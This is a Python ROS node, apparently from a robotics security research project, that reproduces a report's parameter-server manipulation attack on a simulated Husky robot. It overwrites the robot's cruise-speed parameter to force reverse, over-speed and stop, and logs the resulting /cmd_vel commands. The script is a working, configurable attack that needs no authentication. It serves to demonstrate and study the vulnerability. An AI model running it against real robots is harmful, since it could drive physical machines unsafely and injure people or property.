#!/usr/bin/env python3
"""LITERAL reproduction of the security report's "Parameter Server Manipulation"
(§4).

  *** SIMULATION-ONLY SECURITY DEMONSTRATION. No real robot is involved. ***

This standalone rospy node is a DELIBERATE, VERBATIM reproduction of the attack
as SPECIFIED IN THE SECURITY REPORT, section 4 ("Parameter Server Manipulation").
It demonstrates the same class of vulnerability the other attack scripts do:
core ROS infrastructure is UNAUTHENTICATED. Here the infrastructure is the ROS
PARAMETER SERVER (part of the master). It has NO access-control lists, NO
authentication, and NO audit trail -- ANY node that can reach the master may call
rospy.set_param() and overwrite ANY parameter, including one a safety-critical
node re-reads every control tick.

THE VICTIM
----------
husky_auto_drive.py (this project's planner-free driver, modelled on the report's
`/husky_auto_drive`) owns a private cruise-speed param, /husky_auto_drive/
linear_speed, and RE-READS it fresh every ~10 Hz tick to set its commanded wheel
speed. Because it re-reads every tick, whatever value we write lands on the very
next tick.

THE REPORT'S EXACT SEQUENCE (§4)
--------------------------------
We overwrite the param in the report's order, each value held for a dwell:

    1. -5.0    -- REVERSE. A negative cruise speed drives the robot BACKWARD.
                  The victim does not clamp the sign, so this is directly visible.
    2. 100.0   -- OVER-SPEED. A physically impossible forward speed.
    3.  0.0    -- STOP. Ends motion.

The report notes DETECTION via a velocity change exceeding 2.0 m/s between
consecutive commands -- every transition here (0.5->-5.0, -5.0->100.0,
100.0->0.0) clears that 2.0 m/s threshold by a wide margin, so a rate-of-change
monitor on the command stream would flag all three.

HONEST NOTE ON THE 100.0 STEP
-----------------------------
100.0 m/s is NOT literally rendered. The victim publishes linear.x = 100.0 onto
/cmd_vel, but the diff_drive controller and Gazebo physics clamp it to the
robot's achievable wheel speed; the robot lurches to its max forward speed, not
to 100 m/s. What the attack actually proves is that an unauthenticated param
write PROPAGATES into the command stream unchecked -- the clamp is downstream of
the vulnerability, not a mitigation of it. The -5.0 reverse and the 0.0 stop, by
contrast, ARE within the robot's envelope and render faithfully.

TELEMETRY / PROOF (no ground truth -- hard project rule)
--------------------------------------------------------
We never read Gazebo ground truth. Once per second we log, to console and CSV:

  * value_written  -- the param value we most recently set. This is the injection.
  * cmd_linear_x   -- the ACTUAL command reaching the wheels, read by subscribing
                      to /cmd_vel (the victim's output, twist_mux 'external'
                      slot). Tracking value_written -> cmd_linear_x proves the
                      param write propagated all the way to the command stream
                      WITHOUT any ground truth: reverse when we write -5.0, a
                      large positive when we write 100.0, zero when we write 0.0.

CLEAN SHUTDOWN
--------------
The report's own sequence ends at 0.0 (stop), so a completed sequence already
leaves the victim commanding zero. On Ctrl-C we do NOT write any additional
corrective value beyond whatever step the sequence had reached -- we just flush
and close the CSV. Emitting an extra "reset to safe speed" write would be a
SECOND injection; the same "no second injection" discipline as attack_cmd_vel.py
/ attack_odom.py. (If Ctrl-C lands mid-sequence, the last-written step stands --
we do not tidy up on the victim's behalf.)

USAGE (examples)
----------------
    # Reproduce the report's -5.0, 100.0, 0.0 sequence (3 s each), then stop.
    python3 attack_param.py

    # Longer dwell per step, logging to a named CSV.
    python3 attack_param.py --dwell 5 --csv param_repro.csv

    # Keep cycling the sequence until Ctrl-C.
    python3 attack_param.py --loop

    # Target a different param / different values.
    python3 attack_param.py --param /husky_auto_drive/linear_speed \
                            --sequence -3.0 50.0 0.0

Run alongside the victim (three terminals):
    (1) ./load-park-stock-husky.sh          # park WORLD only
    (2) ./husky_auto_drive.py               # the victim driver
    (3) this script

This script was NOT run live end-to-end here (the sim may be down, and running
attacks is the operator's call). Topic/type wiring is stated to MATCH THE DESIGN:
we set the ROS param /husky_auto_drive/linear_speed, and observe the effect on
geometry_msgs/Twist at /cmd_vel (the victim's twist_mux 'external' slot output).
"""

import argparse
import csv
import threading
import time

import rospy
from geometry_msgs.msg import Twist


# ---------------------------------------------------------------------------
# The report's exact §4 sequence and target. Named constants so the startup
# banner can echo them and a reader sees the payload at a glance.
# ---------------------------------------------------------------------------
REPORT_PARAM = "/husky_auto_drive/linear_speed"  # the victim's re-read-per-tick param
REPORT_SEQUENCE = [-5.0, 100.0, 0.0]  # reverse, over-speed, stop
REPORT_DWELL_S = 3.0                  # seconds each value is held
REPORT_DETECT_THRESHOLD = 2.0         # m/s change between commands that flags


class ParamServerAttack(object):
    def __init__(self, args):
        self.args = args
        self._lock = threading.Lock()
        self._cmd = None            # latest (linear.x, angular.z) on /cmd_vel
        self._value_written = None  # latest param value we set
        self._stop = threading.Event()
        self._start_wall = None

        # Telemetry: the ACTUAL command reaching the wheels -- the victim's output
        # on /cmd_vel. This is how we prove the param write propagated, with NO
        # ground truth.
        rospy.Subscriber("/cmd_vel", Twist, self._on_cmd, queue_size=1)

        # CSV: open once, header, flush every row so a mid-run Ctrl-C still leaves
        # a complete file. Same discipline as attack_cmd_vel.py.
        self._csv_file = open(args.csv, "w", newline="")
        self._csv = csv.writer(self._csv_file)
        self._csv.writerow(["elapsed_time", "value_written", "cmd_linear_x"])
        self._csv_file.flush()

    # --- telemetry callback --------------------------------------------------
    def _on_cmd(self, msg):
        """Cache the victim's latest /cmd_vel output -- the command actually
        reaching the wheels, which should track the param value we wrote."""
        with self._lock:
            self._cmd = (msg.linear.x, msg.angular.z)

    # --- the injection -------------------------------------------------------
    def _write(self, value):
        """Overwrite the target param on the unauthenticated ROS param server.
        No credential, no ACL, no audit -- this single call IS the vulnerability."""
        rospy.set_param(self.args.param, value)
        with self._lock:
            self._value_written = value
        rospy.loginfo("SET %s = %s", self.args.param, value)

    # --- telemetry row -------------------------------------------------------
    def _log_row(self):
        with self._lock:
            cmd = self._cmd
            written = self._value_written
        elapsed = time.time() - self._start_wall

        cmd_lx = cmd[0] if cmd else float("nan")
        written_val = written if written is not None else float("nan")

        rospy.loginfo(
            "[t=%6.1fs] value_written=%8.3f  wheels_cmd_linear_x=%8.3f",
            elapsed, written_val, cmd_lx)
        self._csv.writerow(
            ["%.3f" % elapsed, "%.4f" % written_val, "%.4f" % cmd_lx])
        self._csv_file.flush()

    # --- dwell with periodic telemetry ---------------------------------------
    def _hold(self, dwell_s, next_log):
        """Hold the current param value for dwell_s, logging telemetry once per
        second. Returns the updated next_log deadline. Honours stop/shutdown so
        Ctrl-C is responsive mid-dwell. Uses a fixed 10 Hz poll so we never sleep
        past the next telemetry tick or the end of the dwell."""
        end = time.time() + dwell_s
        poll = rospy.Rate(10.0)
        while not self._stop.is_set() and not rospy.is_shutdown():
            now = time.time()
            if now >= next_log:
                self._log_row()
                next_log += 1.0
            if now >= end:
                break
            poll.sleep()
        return next_log

    # --- main loop -----------------------------------------------------------
    def run(self):
        self._start_wall = time.time()
        next_log = self._start_wall + 1.0  # first telemetry row after 1 s

        rospy.loginfo(
            "ATTACK START (report §4 parameter-server manipulation): writing "
            "%s with sequence %s, %.1f s each%s",
            self.args.param, self.args.sequence, self.args.dwell,
            " (looping until Ctrl-C)" if self.args.loop else " once, then stop")
        rospy.loginfo(
            "Report's exact §4 payload: %s = %s, %.1f s each. Detection: a "
            "command change > %.1f m/s flags -- every step here clears that.",
            REPORT_PARAM, REPORT_SEQUENCE, REPORT_DWELL_S,
            REPORT_DETECT_THRESHOLD)

        while not self._stop.is_set() and not rospy.is_shutdown():
            for value in self.args.sequence:
                if self._stop.is_set() or rospy.is_shutdown():
                    break
                self._write(value)
                next_log = self._hold(self.args.dwell, next_log)
            if not self.args.loop:
                rospy.loginfo("Sequence complete (final value %s) -- stopping.",
                              self.args.sequence[-1] if self.args.sequence
                              else "n/a")
                break

    def shutdown(self):
        """Stop and close the CSV. Idempotent. NO corrective param write beyond
        the sequence's own final value is made -- we just cease. The report's
        sequence already ends at 0.0 (stop), so a completed run leaves the victim
        commanding zero on its own."""
        self._stop.set()
        try:
            if not self._csv_file.closed:
                self._csv_file.flush()
                self._csv_file.close()
        except Exception as exc:  # noqa: BLE001 -- log, never hide
            rospy.logwarn("Error closing CSV: %s", exc)
        rospy.loginfo("ATTACK STOPPED. CSV saved to %s", self.args.csv)


def parse_args():
    p = argparse.ArgumentParser(
        description="Simulation-only parameter-server manipulation demo "
                    "(report §4): overwrites the victim's re-read-per-tick "
                    "cruise-speed param to force reverse, over-speed, and stop.")
    p.add_argument("--param", default=REPORT_PARAM,
                   help="target parameter to overwrite (default %s, the victim's "
                        "cruise-speed param)" % REPORT_PARAM)
    p.add_argument("--sequence", type=float, nargs="+", default=REPORT_SEQUENCE,
                   help="ordered speed values to write, m/s "
                        "(default: -5.0 100.0 0.0, the report's §4 sequence)")
    p.add_argument("--dwell", type=float, default=REPORT_DWELL_S,
                   help="seconds to hold each value (default 3.0)")
    p.add_argument("--loop", action="store_true",
                   help="cycle the sequence until Ctrl-C instead of stopping "
                        "after one pass (default: run once, leaving the final "
                        "value, then stop)")
    p.add_argument("--csv", default="attack_param_report.csv",
                   help="telemetry output CSV path "
                        "(default attack_param_report.csv)")
    args = p.parse_args()
    if args.dwell <= 0:
        p.error("--dwell must be > 0")
    if not args.sequence:
        p.error("--sequence must have at least one value")
    return args


def main():
    args = parse_args()
    # anonymous=True: multiple attacker instances (or reruns) must not collide on
    # a node name.
    rospy.init_node("attack_param", anonymous=True)

    attack = ParamServerAttack(args)
    # Register cleanup for every exit path (Ctrl-C, sequence end, rospy shutdown).
    rospy.on_shutdown(attack.shutdown)

    try:
        attack.run()
    except rospy.ROSInterruptException:
        pass
    finally:
        # on_shutdown may not fire on a clean sequence-complete exit -- ensure
        # cleanup.
        attack.shutdown()


if __name__ == "__main__":
    main()
